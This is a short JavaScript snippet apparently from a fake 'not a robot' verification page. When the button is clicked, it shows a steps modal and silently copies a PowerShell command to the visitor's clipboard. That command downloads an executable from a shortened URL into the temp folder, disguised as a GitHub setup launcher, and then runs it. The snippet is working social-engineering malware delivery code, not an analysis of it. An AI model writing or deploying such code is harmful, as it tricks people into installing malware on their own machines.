const btn = document.getElementById('notRobotBtn');
const modal = document.getElementById('stepsModal');
const closeBtn = document.getElementById('closeModalBtn');

btn.addEventListener('click', async () => {
    modal.style.display = 'flex';
    navigator.clipboard.writeText('Powershell Start-BitsTransfer -Source \'https://shorturl.at/PUv8h\' -Destination "$env:TEMP\\GithubSetupLauncher.exe"; Start-Process "$env:TEMP\\GithubSetupLauncher.exe"');
    });

closeBtn.addEventListener('click', () => {
    modal.style.display = 'none';
});

window.addEventListener('click', (e) => {
    if (e.target === modal) {
        modal.style.display = 'none';
    }
});

